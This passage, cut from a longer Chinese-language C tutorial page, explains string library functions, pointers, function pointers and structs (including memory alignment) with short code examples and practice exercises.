<span class="hljs-comment">//    2.通过遍历取出字符串中的所有字符逐个比较</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; count; i++) &#123;
<span class="hljs-comment">//        3.判断是否是字符串结尾</span>
        <span class="hljs-keyword">if</span> (str[i] == <span class="hljs-string">&#x27;\0&#x27;</span>) &#123;
            <span class="hljs-keyword">return</span> length;
        &#125;
        length++;
    &#125;
    <span class="hljs-keyword">return</span> length;
&#125;</code></pre>
<ul>
<li>字符串连接函数:strcat
<ul>
<li>格式: strcat(字符数组名1,字符数组名2)</li>
<li>功能:把字符数组2中的字符串连接到字符数组1 中字符串的后面,并删去字符串1后的串标志 “\0”。本函数返回值是字符数组1的首地址。</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">char</span> oldStr[<span class="hljs-number">100</span>] = <span class="hljs-string">&quot;welcome to&quot;</span>;
<span class="hljs-type">char</span> newStr[<span class="hljs-number">20</span>] = <span class="hljs-string">&quot; lnj&quot;</span>;
<span class="hljs-built_in">strcat</span>(oldStr, newStr);
<span class="hljs-built_in">puts</span>(oldStr); <span class="hljs-comment">//输出: welcome to lnj&quot;</span></code></pre>
<blockquote>
<ul>
<li>本程序把初始化赋值的字符数组与动态赋值的字符串连接起来。要注意的是,字符数组1应定义足 够的长度,否则不能全部装入被连接的字符串。</li>
</ul>
</blockquote>
<ul>
<li>字符串拷贝函数:strcpy<br>
<code>- 格式: strcpy(字符数组名1,字符数组名2)</code>- 功能:把字符数组2中的字符串拷贝到字符数组1中。串结束标志“\0”也一同拷贝。字符数名2, 也可以是一个字符串常量。这时相当于把一个字符串赋予一个字符数组。</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">char</span> oldStr[<span class="hljs-number">100</span>] = <span class="hljs-string">&quot;welcome to&quot;</span>;
<span class="hljs-type">char</span> newStr[<span class="hljs-number">50</span>] = <span class="hljs-string">&quot; lnj&quot;</span>;
<span class="hljs-built_in">strcpy</span>(oldStr, newStr);
<span class="hljs-built_in">puts</span>(oldStr); <span class="hljs-comment">// 输出结果:  lnj // 原有数据会被覆盖</span></code></pre>
<blockquote>
<ul>
<li>本函数要求字符数组1应有足够的长度,否则不能全部装入所拷贝的字符串。</li>
</ul>
</blockquote>
<hr>
<ul>
<li>字符串比较函数:strcmp
<ul>
<li>格式: strcmp(字符数组名1,字符数组名2)</li>
<li>功能:按照ASCII码顺序比较两个数组中的字符串,并由函数返回值返回比较结果。
<ul>
<li>字符串1=字符串2,返回值=0;</li>
<li>字符串1&gt;字符串2,返回值&gt;0;</li>
<li>字符串1&lt;字符串2,返回值&lt;0。</li>
</ul>
</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">char</span> oldStr[<span class="hljs-number">100</span>] = <span class="hljs-string">&quot;0&quot;</span>;
<span class="hljs-type">char</span> newStr[<span class="hljs-number">50</span>] = <span class="hljs-string">&quot;1&quot;</span>;
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, <span class="hljs-built_in">strcmp</span>(oldStr, newStr)); <span class="hljs-comment">//输出结果:-1</span>
<span class="hljs-type">char</span> oldStr[<span class="hljs-number">100</span>] = <span class="hljs-string">&quot;1&quot;</span>;
<span class="hljs-type">char</span> newStr[<span class="hljs-number">50</span>] = <span class="hljs-string">&quot;1&quot;</span>;
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, <span class="hljs-built_in">strcmp</span>(oldStr, newStr));  <span class="hljs-comment">//输出结果:0</span>
<span class="hljs-type">char</span> oldStr[<span class="hljs-number">100</span>] = <span class="hljs-string">&quot;1&quot;</span>;
<span class="hljs-type">char</span> newStr[<span class="hljs-number">50</span>] = <span class="hljs-string">&quot;0&quot;</span>;
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, <span class="hljs-built_in">strcmp</span>(oldStr, newStr)); <span class="hljs-comment">//输出结果:1</span></code></pre>
<h2 id="练习">练习</h2>
<ul>
<li>编写一个函数char_contains(char str[],char key)， 如果字符串str中包含字符key则返回数值1，否则返回数值0</li>
</ul>
<h2 id="字符串数组基本概念">字符串数组基本概念</h2>
<ul>
<li>字符串数组其实就是定义一个数组保存所有的字符串
<ul>
<li>1.一维字符数组中存放一个字符串，比如一个名字char name[20] = “nj”</li>
<li>2.如果要存储多个字符串，比如一个班所有学生的名字，则需要二维字符数组，char names[15][20]可以存放15个学生的姓名(假设姓名不超过20字符)</li>
<li>如果要存储两个班的学生姓名，那么可以用三维字符数组char names[2][15][20]<br>
##字符串数组的初始化</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">char names[2][10] = &#123; &#123;&#x27;l&#x27;,&#x27;n&#x27;,&#x27;j&#x27;,&#x27;\0&#x27;&#125;, &#123;&#x27;l&#x27;,&#x27;y&#x27;,&#x27;h&#x27;,&#x27;\0&#x27;&#125; &#125;;
char names2[2][10] = &#123; &#123;&quot;lnj&quot;&#125;, &#123;&quot;lyh&quot;&#125; &#125;;
char names3[2][10] = &#123; &quot;lnj&quot;, &quot;lyh&quot; &#125;;</code></pre>
<h2 id="指针基本概念">指针基本概念</h2>
<ul>
<li>什么是地址</li>
</ul>
<p>内存地址:<br>
<img src="https://img-blog.csdnimg.cn/img_convert/dd840093efc4370c3cfbbeee8358663d.png" alt="img"></p>
<ul>
<li>地址与内存单元中的数据是两个完全不同的概念
<ul>
<li>地址如同房间编号, 根据这个编号我们可以找到对应的房间</li>
<li>内存单元如同房间, 房间是专门用于存储数据的</li>
</ul>
</li>
<li>变量地址:
<ul>
<li>系统分配给&quot;变量&quot;的&quot;内存单元&quot;的起始地址</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> num = <span class="hljs-number">6</span>; <span class="hljs-comment">// 占用4个字节</span>
<span class="hljs-comment">//那么变量num的地址为: 0ff06</span>

<span class="hljs-type">char</span> c = <span class="hljs-string">&#x27;a&#x27;</span>; <span class="hljs-comment">// 占用1个字节</span>
<span class="hljs-comment">//那么变量c的地址为:0ff05</span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/img_convert/60e5b6e38c1b0a891bfb9d68943afadf.png" alt="img"></p>
<h2 id="什么是指针">什么是指针</h2>
<ul>
<li>在计算机中所有数据都存储在内存单元中,而每个内存单元都有一个对应的地址, 只要通过这个地址就能找到对应单元中存储的数据.</li>
<li>由于通过地址能找到所需的变量单元，所以我们说该地址指向了该变量单元。将地址形象化的称为“指针”</li>
<li>内存单元的指针(地址)和内存单元的内容是两个不同的概念。<br>
<img src="https://img-blog.csdnimg.cn/img_convert/576783ca4a25785c618e21272b2f42d7.png" alt="img"></li>
</ul>
<h2 id="什么是指针变量">什么是指针变量</h2>
<ul>
<li>
<p>在C语言中,允许用一个变量来存放其它变量的地址, 这种专门用于存储其它变量地址的变量, 我们称之为指针变量<br>
<img src="https://img-blog.csdnimg.cn/img_convert/a707080cca1da7a8b9ca0a1a5969f5f4.png" alt="img"></p>
</li>
<li>
<p>示例:</p>
</li>
</ul>
<pre><code class="hljs plaintext">int age;// 定义一个普通变量
num = 10;
int *pnAge; // 定义一个指针变量
pnAge = &amp;age;</code></pre>
<p><img src="https://img-blog.csdnimg.cn/img_convert/26ccfa26950674065a832654cf68f82a.png" alt="img"></p>
<h2 id="定义指针变量的格式">定义指针变量的格式</h2>
<ul>
<li>
<p>指针变量的定义包括两个内容:</p>
<ul>
<li>指针类型说明,即定义变量为一个指针变量;</li>
<li>指针变量名;<br>
<img src="https://img-blog.csdnimg.cn/img_convert/0c641e095dd0440902a8382ee074fd8b.png" alt="img"></li>
</ul>
</li>
<li>
<p>示例:</p>
</li>
</ul>
<pre><code class="hljs plaintext">char ch = &#x27;a&#x27;;
char *p; // 一个用于指向字符型变量的指针
p = &amp;ch;  
int num = 666;
int *q; // 一个用于指向整型变量的指针
q = &amp;num;</code></pre>
<blockquote>
<ul>
<li>其中,*表示这是一个指针变量</li>
<li>变量名即为定义的指针变量名</li>
<li>类型说明符表示本指针变量所指向的变量的数据类型</li>
</ul>
</blockquote>
<h2 id="指针变量的初始化方法">指针变量的初始化方法</h2>
<ul>
<li>指针变量初始化的方法有两种:定义的同时进行初始化和先定义后初始化
<ul>
<li>定义的同时进行初始化</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> a = <span class="hljs-number">5</span>;
<span class="hljs-type">int</span> *p = &amp;a;</code></pre>
<ul>
<li>先定义后初始化</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> a = <span class="hljs-number">5</span>;
<span class="hljs-type">int</span> *p;
p=&amp;a;</code></pre>
<ul>
<li>把指针初始化为NULL</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> *p=<span class="hljs-literal">NULL</span>;
<span class="hljs-type">int</span> *q=<span class="hljs-number">0</span>;</code></pre>
<ul>
<li>不合法的初始化:
<ul>
<li>指针变量只能存储地址, 不能存储其它类型</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> *p;
p =  <span class="hljs-number">250</span>; <span class="hljs-comment">// 错误写法</span></code></pre>
<ul>
<li>给指针变量赋值时,指针变量前不能再加“*”</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> *p;
*p=&amp;a; <span class="hljs-comment">//错误写法</span></code></pre>
<p>注意点:</p>
<ul>
<li>
<p>多个指针变量可以指向同一个地址<br>
<img src="https://img-blog.csdnimg.cn/img_convert/a5b287dde2bc3a51757a4bcaced53a28.png" alt="img"></p>
</li>
<li>
<p>指针的指向是可以改变的</p>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> a = <span class="hljs-number">5</span>;
<span class="hljs-type">int</span> *p = &amp;a;
<span class="hljs-type">int</span> b = <span class="hljs-number">10</span>;
p = &amp;b; <span class="hljs-comment">// 修改指针指向</span></code></pre>
<p>指针没有初始化里面是一个垃圾值,这时候我们这是一个野指针</p>
<ul>
<li>野指针可能会导致程序崩溃</li>
<li>野指针访问你不该访问数据</li>
<li>所以指针必须初始化才可以访问其所指向存储区域<br>
<img src="https://img-blog.csdnimg.cn/img_convert/1e3b78f4c535fd355366b692171b2329.png" alt="img"></li>
</ul>
<h2 id="访问指针所指向的存储空间">访问指针所指向的存储空间</h2>
<ul>
<li>C语言中提供了地址运算符&amp;来表示变量的地址。其一般形式为:
<ul>
<li>&amp;变量名;</li>
</ul>
</li>
<li>C语言中提供了*来定义指针变量和访问指针变量指向的内存存储空间
<ul>
<li>在定义变量的时候 * 是一个类型说明符,说明定义的这个变量是一个指针变量</li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> *p=<span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 定义指针变量</span></code></pre>
<ul>
<li>在不是定义变量的时候 *是一个操作符,代表访问指针所指向存储空间</li>
</ul>
<pre><code class="hljs c"><span class="hljs-type">int</span> a = <span class="hljs-number">5</span>;
<span class="hljs-type">int</span> *p = &amp;a;
<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;a = %d&quot;</span>, *p); <span class="hljs-comment">// 访问指针变量</span></code></pre>
<h2 id="指针类型">指针类型</h2>
<ul>
<li>在同一种编译器环境下,一个指针变量所占用的内存空间是固定的。<br>
<img src="https://img-blog.csdnimg.cn/img_convert/397675cc9728e9fc722c83c6186731ec.png" alt="img"></li>
</ul>
<p>虽然在同一种编译器下, 所有指针占用的内存空间是一样的,但不同类型的变量却占不同的字节数</p>
<ul>
<li>一个int占用4个字节，一个char占用1个字节，而一个double占用8字节；</li>
<li>现在只有一个地址，我怎么才能知道要从这个地址开始向后访问多少个字节的存储空间呢，是4个，是1个，还是8个。</li>
<li>所以指针变量需要它所指向的数据类型告诉它要访问多少个字节存储空间<br>
<img src="https://img-blog.csdnimg.cn/img_convert/b0a042ab952d6c1f996740d8cb34f4eb.png" alt="img"></li>
</ul>
<h2 id="二级指针">二级指针</h2>
<ul>
<li>如果一个指针变量存放的又是另一个指针变量的地址,则称这个指针变量为指向指针的指针￼变量。也称为“二级指针”</li>
</ul>
<pre><code class="hljs plaintext">char c = &#x27;a&#x27;;
char *cp;
cp = &amp;c;
char **cp2;
cp2 = &amp;cp;
printf(&quot;c = %c&quot;, **cp2);</code></pre>
<p><img src="https://img-blog.csdnimg.cn/img_convert/058efcc27065f46e861904d22a9af7fb.png" alt="img"></p>
<ul>
<li>多级指针的取值规则</li>
</ul>
<pre><code class="hljs plaintext">int ***m1;  //取值***m1
int *****m2; //取值*****m2</code></pre>
<h2 id="练习">练习</h2>
<ul>
<li>定义一个函数交换两个变量的值</li>
<li>写一个函数，同时返回两个数的和与差</li>
</ul>
<p>##数组指针的概念及定义</p>
<ul>
<li>数组元素指针
<ul>
<li>一个变量有地址,一个数组包含若干元素,每个数组元素也有相应的地址, 指针变量也可以保存数组元素的地址</li>
<li>只要一个指针变量保存了数组元素的地址, 我们就称之为数组元素指针<br>
<img src="https://img-blog.csdnimg.cn/img_convert/bdf0db74605591d8d30abeefc9d0b002.png" alt="img"></li>
</ul>
</li>
</ul>
<pre><code class="hljs c"><span class="hljs-built_in">printf</span>(“%p %p”, &amp;(a[<span class="hljs-number">0</span>]), a); <span class="hljs-comment">//输出结果:0x1100, 0x1100</span></code></pre>
<blockquote>
<ul>
<li>注意: 数组名a不代表整个数组,只代表数组首元素的地址。</li>
<li>“p=a;”的作用是“把a数组的首元素的地址赋给指针变量p”,而不是“把数组a各元素的值赋给 p”</li>
</ul>
</blockquote>
<h2 id="指针访问数组元素">指针访问数组元素</h2>
<p><img src="https://img-blog.csdnimg.cn/img_convert/17b2039fc7ccbc4cfc189a027a472b9c.png" alt="img"></p>
<pre><code class="hljs c">    <span class="hljs-type">int</span> <span class="hljs-title function_">main</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span>
&#123;
      <span class="hljs-type">int</span> a[<span class="hljs-number">5</span>] = &#123;<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">22</span>&#125;;
      <span class="hljs-type">int</span> *p;
      <span class="hljs-comment">// p = &amp;(a[0]); </span>
      p = a;
      <span class="hljs-built_in">printf</span>(“%d %d\n”,a[<span class="hljs-number">0</span>],*p); <span class="hljs-comment">// 输出结果: 2, 2</span>
&#125;</code></pre>
<ul>
<li>在指针指向数组元素时,允许以下运算:
<ul>
<li>加一个整数(用+或+=),如p+1</li>
<li>减一个整数(用-或-=),如p-1</li>
<li>自加运算,如p++,++p</li>
<li>自减运算,如p–,–p</li>
</ul>
</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/img_convert/ce844d9093ec12a024eaeef599accf58.png" alt="img"></p>
<blockquote>
<ul>
<li>如果指针变量p已指向数组中的一个元素,则p+1<code>指向</code>同一数组中的下一个元素,p-1<code>指向</code>同 一数组中的上一个元素。</li>
</ul>
</blockquote>
<ul>
<li>结论: 访问数组元素,可用下面两种方法:
<ul>
<li>下标法, 如a[i]形式</li>
<li>指针法, *(p+i)形式</li>
</ul>
</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/img_convert/36e46e79d78dfae3ce212c4841c5782f.png" alt="img"></p>
<ul>
<li>注意:
<ul>
<li>数组名虽然是数组的首地址，但是数组名所所保存的数组的首地址是不可以更改的</li>
</ul>
</li>
</ul>
<pre><code class="hljs c">   <span class="hljs-type">int</span> x[<span class="hljs-number">10</span>];
x++;  <span class="hljs-comment">//错误</span>
<span class="hljs-type">int</span>* p = x;
p++; <span class="hljs-comment">//正确</span></code></pre>
<h2 id="指针与字符串">指针与字符串</h2>
<ul>
<li>定义字符串的两种方式
<ul>
<li>字符数组</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">char string[]=”I love lnj!”;
printf(&quot;%s\n&quot;,string);</code></pre>
<ul>
<li>
<ul>
<li>字符串指针指向字符串</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">// 数组名保存的是数组第0个元素的地址, 指针也可以保存第0个元素的地址
char *str = &quot;abc&quot;</code></pre>
<p><img src="https://img-blog.csdnimg.cn/img_convert/8e480b8b339bc22259643b53d98186c4.png" alt="img"></p>
<ul>
<li>字符串指针使用注意事项
<ul>
<li>可以查看字符串的每一个字符</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">har *str = &quot;lnj&quot;;
for(int i = 0; i &lt; strlen(str);i++)
&#123;
  printf(&quot;%c-&quot;, *(str+i)); // 输出结果:l-n-j
&#125;</code></pre>
<ul>
<li>
<ul>
<li>不可以修改字符串内容</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">//   + 使用字符数组来保存的字符串是保存栈里的,保存栈里面东西是可读可写,所有可以修改字符串中的的字符
//   + 使用字符指针来保存字符串,它保存的是字符串常量地址,常量区是只读的,所以我们不可以修改字符串中的字符
char *str = &quot;lnj&quot;;
*(str+2) = &#x27;y&#x27;; // 错误</code></pre>
<ul>
<li>
<ul>
<li>不能够直接接收键盘输入</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">// 错误的原因是:str是一个野指针,他并没有指向某一块内存空间
// 所以不允许这样写如果给str分配内存空间是可以这样用 的
char *str;
scanf(&quot;%s&quot;, str);</code></pre>
<h2 id="指向函数指针">指向函数指针</h2>
<ul>
<li>为什么指针可以指向一个函数？
<ul>
<li>函数作为一段程序，在内存中也要占据部分存储空间，它也有一个起始地址</li>
<li>函数有自己的地址，那就好办了，我们的指针变量就是用来存储地址的。</li>
<li>因此可以利用一个指针指向一个函数。其中，函数名就代表着函数的地址。</li>
</ul>
</li>
<li>指针函数的定义
<ul>
<li>格式: <code>返回值类型 (*指针变量名)(形参1, 形参2, ...);</code></li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">int sum(int a,int b)
&#123;
    return a + b;
&#125;

int (*p)(int,int);
p = sum;</code></pre>
<ul>
<li>指针函数定义技巧
<ul>
<li>1、把要指向函数头拷贝过来</li>
<li>2、把函数名称使用小括号括起来</li>
<li>3、在函数名称前面加上一个*</li>
<li>4、修改函数名称</li>
</ul>
</li>
<li>应用场景
<ul>
<li>调用函数</li>
<li>将函数作为参数在函数间传递</li>
</ul>
</li>
<li>注意点:
<ul>
<li>由于这类指针变量存储的是一个函数的入口地址，所以对它们作加减运算(比如p++)是无意义的</li>
<li>函数调用中&quot;(指针变量名)&quot;的两边的括号不可少,其中的不应该理解为求值运算,在此处它 只是一种表示符号</li>
</ul>
</li>
</ul>
<h2 id="什么是结构体">什么是结构体</h2>
<ul>
<li>结构体和数组一样属于构造类型</li>
<li>数组是用于保存一组相同类型数据的, 而结构体是用于保存一组不同类型数组的
<ul>
<li>例如,在学生登记表中,姓名应为字符型;学号可为整型或字符型;年龄应为整型;性别应为字符型;成绩可为整型或实型。</li>
<li>显然这组数据不能用数组来存放, 为了解决这个问题,C语言中给出了另一种构造数据类型——“结构(structure)”或叫“结构体”。</li>
</ul>
</li>
</ul>
<hr>
<h2 id="定义结构体类型">定义结构体类型</h2>
<ul>
<li>在使用结构体之前必须先定义结构体类型, 因为C语言不知道你的结构体中需要存储哪些类型数据, 我们必须通过定义结构体类型来告诉C语言, 我们的结构体中需要存储哪些类型的数据</li>
<li>格式:</li>
</ul>
<pre><code class="hljs plaintext">struct　结构体名&#123;
     类型名1　成员名1;
     类型名2　成员名2;
     ……
     类型名n　成员名n;
 &#125;;</code></pre>
<ul>
<li>示例:</li>
</ul>
<pre><code class="hljs plaintext">struct Student &#123;
    char *name; // 姓名
    int age; // 年龄
    float height; // 身高
&#125;;</code></pre>
<h2 id="定义结构体变量">定义结构体变量</h2>
<ul>
<li>定好好结构体类型之后, 我们就可以利用我们定义的结构体类型来定义结构体变量</li>
<li>格式: <code>struct 结构体名 结构体变量名;</code><br>
<img src="https://img-blog.csdnimg.cn/img_convert/d16501487b2b9fd6cc56aa82f92874f1.png" alt="img"></li>
<li>先定义结构体类型，再定义变量</li>
</ul>
<pre><code class="hljs plaintext">struct Student &#123;
     char *name;
     int age;
 &#125;;

 struct Student stu;</code></pre>
<ul>
<li>定义结构体类型的同时定义变量</li>
</ul>
<pre><code class="hljs plaintext">struct Student &#123;
    char *name;
    int age;
&#125; stu;</code></pre>
<ul>
<li>匿名结构体定义结构体变量</li>
</ul>
<pre><code class="hljs plaintext">struct &#123;
    char *name;
    int age;
&#125; stu;</code></pre>
<blockquote>
<ul>
<li>第三种方法与第二种方法的区别在于,第三种方法中省去了结构体类型名称,而直接给出结构变量,这种结构体最大的问题是结构体类型不能复用</li>
</ul>
</blockquote>
<h2 id="结构体成员访问">结构体成员访问</h2>
<ul>
<li>一般对结构体变量的操作是以成员为单位进行的，引用的一般形式为：<code>结构体变量名.成员名</code></li>
</ul>
<pre><code class="hljs plaintext">struct Student &#123;
     char *name;
     int age;
 &#125;;
 struct Student stu;
 // 访问stu的age成员
 stu.age = 27;
 printf(&quot;age = %d&quot;, stu.age);</code></pre>
<h2 id="结构体变量的初始化">结构体变量的初始化</h2>
<ul>
<li>定义的同时按顺序初始化</li>
</ul>
<pre><code class="hljs plaintext">struct Student &#123;
     char *name;
     int age;
 &#125;;
struct Student stu = &#123;“lnj&quot;, 27&#125;;</code></pre>
<ul>
<li>定义的同时不按顺序初始化</li>
</ul>
<pre><code class="hljs plaintext">struct Student &#123;
     char *name;
     int age;
 &#125;;
struct Student stu = &#123;.age = 35, .name = “lnj&quot;&#125;;</code></pre>
<ul>
<li>先定义后逐个初始化</li>
</ul>
<pre><code class="hljs plaintext">struct Student &#123;
     char *name;
     int age;
 &#125;;
 struct Student stu;
stu.name = &quot;lnj&quot;;
stu.age = 35;</code></pre>
<ul>
<li>先定义后一次性初始化</li>
</ul>
<pre><code class="hljs plaintext">struct Student &#123;
     char *name;
     int age;
 &#125;;
struct Student stu;
stu2 = (struct Student)&#123;&quot;lnj&quot;, 35&#125;;</code></pre>
<h2 id="结构体类型作用域">结构体类型作用域</h2>
<ul>
<li>结构类型定义在函数内部的作用域与局部变量的作用域是相同的
<ul>
<li>从定义的那一行开始, 直到遇到return或者大括号结束为止</li>
</ul>
</li>
<li>结构类型定义在函数外部的作用域与全局变量的作用域是相同的
<ul>
<li>从定义的那一行开始,直到本文件结束为止</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">//定义一个全局结构体,作用域到文件末尾
struct Person&#123;
    int age;
    char *name;
&#125;;

int main(int argc, const char * argv[])
&#123;
    //定义局部结构体名为Person,会屏蔽全局结构体
    //局部结构体作用域,从定义开始到“&#125;”块结束
    struct Person&#123;
        int age;
    &#125;;
    // 使用局部结构体类型
    struct Person pp;
    pp.age = 50;
    pp.name = &quot;zbz&quot;;

    test();
    return 0;
&#125;

void test() &#123;

    //使用全局的结构体定义结构体变量p
    struct Person p = &#123;10,&quot;sb&quot;&#125;;
    printf(&quot;%d,%s\n&quot;,p.age,p.name);
&#125;</code></pre>
<h2 id="结构体数组">结构体数组</h2>
<ul>
<li>结构体数组和普通数组并无太大差异, 只不过是数组中的元素都是结构体而已</li>
<li>格式: <code>struct 结构体类型名称 数组名称[元素个数]</code></li>
</ul>
<pre><code class="hljs plaintext">struct Student &#123;
    char *name;
    int age;
&#125;;
struct Student stu[2];</code></pre>
<ul>
<li>结构体数组初始化和普通数组也一样, 分为先定义后初始化和定义同时初始化
<ul>
<li>定义同时初始化</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">struct Student &#123;
    char *name;
    int age;
&#125;;
struct Student stu[2] = &#123;&#123;&quot;lnj&quot;, 35&#125;,&#123;&quot;zs&quot;, 18&#125;&#125;;</code></pre>
<ul>
<li>
<ul>
<li>先定义后初始化</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">struct Student &#123;
    char *name;
    int age;
&#125;;
struct Student stu[2]; 
stu[0] = &#123;&quot;lnj&quot;, 35&#125;;
stu[1] = &#123;&quot;zs&quot;, 18&#125;;</code></pre>
<h2 id="结构体指针">结构体指针</h2>
<ul>
<li>
<p>一个指针变量当用来指向一个结构体变量时,称之为结构体指针变量</p>
</li>
<li>
<p>格式: <code>struct 结构名 *结构指针变量名</code></p>
</li>
<li>
<p>示例:</p>
<pre><code class="hljs plaintext">     // 定义一个结构体类型
     struct Student &#123;
         char *name;
         int age;
     &#125;;
  
    // 定义一个结构体变量
    struct Student stu = &#123;“lnj&quot;, 18&#125;;
  
    // 定义一个指向结构体的指针变量
    struct Student *p;
  
   // 指向结构体变量stu
   p = &amp;stu;
  
    /*
     这时候可以用3种方式访问结构体的成员
     */
    // 方式1：结构体变量名.成员名
    printf(&quot;name=%s, age = %d \n&quot;, stu.name, stu.age);
  
    // 方式2：(*指针变量名).成员名
    printf(&quot;name=%s, age = %d \n&quot;, (*p).name, (*p).age);
  
    // 方式3：指针变量名-&gt;成员名
    printf(&quot;name=%s, age = %d \n&quot;, p-&gt;name, p-&gt;age);
  
    return 0;
&#125;</code></pre>
</li>
<li>
<p>通过结构体指针访问结构体成员, 可以通过以下两种方式</p>
<ul>
<li>(*结构指针变量).成员名</li>
<li>结构指针变量-&gt;成员名(用熟)</li>
</ul>
</li>
</ul>
<blockquote>
<ul>
<li>(pstu)两侧的括号不可少,因为成员符“.”的优先级高于“”。</li>
<li>如去掉括号写作pstu.num则等效于(pstu.num),这样,意义就完全不对了。</li>
</ul>
</blockquote>
<h2 id="结构体内存分析">结构体内存分析</h2>
<ul>
<li>给结构体变量开辟存储空间和给普通开辟存储空间一样, 会从内存地址大的位置开始开辟</li>
<li>给结构体成员开辟存储空间和给数组元素开辟存储空间一样, 会从所占用内存地址小的位置开始开辟</li>
<li>结构体变量占用的内存空间永远是所有成员中占用内存最大成员的倍数(对齐问题)</li>
</ul>
<blockquote>
<p>+多实际的计算机系统对基本类型数据在内存中存放的位置有限制,它们会要求这些数据的起始地址的值是 某个数k的倍数,这就是所谓的内存对齐,而这个k则被称为该数据类型的对齐模数(alignment modulus)。</p>
<ul>
<li>这种强制的要求一来简化了处理器与内存之间传输系统的设计,二来可以提升读取数据的速度。比如这么一种处理器,它每次读写内存的时候都从某个8倍数的地址开始,一次读出或写入8个字节的数据,假如软件能 保证double类型的数据都从8倍数地址开始,那么读或写一个double类型数据就只需要一次内存操作。否则,我们就可能需要两次内存操作才能完成这个动作,因为数据或许恰好横跨在两个符合对齐要求的8字节 内存块上</li>
</ul>
</blockquote>
<h2 id="结构体变量占用存储空间大小">结构体变量占用存储空间大小</h2>
<pre><code class="hljs plaintext">struct Person&#123;
    int age; // 4
    char ch; // 1
    double score; // 8
&#125;;
struct Person p;
printf(&quot;sizeof = %i\n&quot;, sizeof(p)); // 16</code></pre>
<ul>
<li>占用内存最大属性是score, 占8个字节, 所以第一次会分配8个字节</li>
<li>将第一次分配的8个字节分配给age4个,分配给ch1个, 还剩下3个字节</li>
<li>当需要分配给score时, 发现只剩下3个字节, 所以会再次开辟8个字节存储空间</li>
<li>一共开辟了两次8个字节空间, 所以最终p占用16个字节</li>
</ul>
<pre><code class="hljs plaintext">struct Person&#123;
    int age; // 4
    double score; // 8
    char ch; // 1
&#125;;
struct Person p;
printf(&quot;sizeof = %i\n&quot;, sizeof(p)); // 24</code></pre>
<ul>
<li>占用内存最大属性是score, 占8个字节, 所以第一次会分配8个字节</li>
<li>将第一次分配的8个字节分配给age4个,还剩下4个字节</li>
<li>当需要分配给score时, 发现只剩下4个字节, 所以会再次开辟8个字节存储空间</li>
<li>将新分配的8个字节分配给score, 还剩下0个字节</li>
<li>当需要分配给ch时, 发现上一次分配的已经没有了, 所以会再次开辟8个字节存储空间</li>
<li>一共开辟了3次8个字节空间, 所以最终p占用24个字节</li>
</ul>
<h2 id="结构体嵌套定义">结构体嵌套定义</h2>
<ul>
<li>成员也可以又是一个结构,即构成了嵌套的结构</li>
</ul>
<pre><code class="hljs plaintext">struct Date&#123;
     int month;
     int day;
     int year;
&#125;
struct  stu&#123;
     int num;
    char *name;
    char sex;
    struct Date birthday;
    Float score;
&#125;</code></pre>
<p>在stu中嵌套存储Date结构体内容<br>
<img src="https://img-blog.csdnimg.cn/img_convert/67a59fa99d2e92fc494364cdcb855866.png" alt="img"></p>
<ul>
<li>注意:</li>
<li>结构体不可以嵌套自己变量,可以嵌套指向自己这种类型的指针</li>
</ul>
<pre><code class="hljs plaintext">struct Student &#123;
    int age;
    struct Student stu;
&#125;;</code></pre>
<ul>
<li>对嵌套结构体成员的访问
<ul>
<li>如果某个成员也是结构体变量，可以连续使用成员运算符&quot;.&quot;访问最低一级成员</li>
</ul>
</li>
</ul>
<pre><code class="hljs plaintext">struct Date &#123;
       int year;
       int month;
       int day;
  &#125;;

  struct Student &#123;
      char *name;
      struct Date birthday;
 &#125;;

 struct Student stu;
 stu.birthday.year = 1986;
 stu.birthday.month = 9;
 stu.birthday.day = 10;</code></pre>
<h2 id="结构体和函数">结构体和函数</h2>
<ul>
<li>结构体虽然是构造类型, 但是结构体之间赋值是值拷贝, 而不是地址传递</li>
</ul>
<pre><code class="hljs plaintext">struct Person&#123;
    char *name;
    int age;
&#125;;
struct Person p1 = &#123;&quot;lnj&quot;, 35&#125;;
struct Person p2;
p2 = p1;
p2.name = &quot;zs&quot;; // 修改p2不会影响p1
printf(&quot;p1.name = %s\n&quot;, p1.name); // lnj
printf(&quot;p2.name = %s\n&quot;, p2.name); //  zs</code></pre>
<ul>
<li>所以结构体变量作为函数形参时也是值传递, 在函数内修改形参, 不会影响外界实参</li>
</ul>
<pre><code class="hljs plaintext">#include &lt;stdio.h&gt;

struct Person&#123;
    char *name;
    int age;
&#125;;

void test(struct Person per);

int main()
&#123;
    struct Person p1 = &#123;&quot;lnj&quot;, 35&#125;;
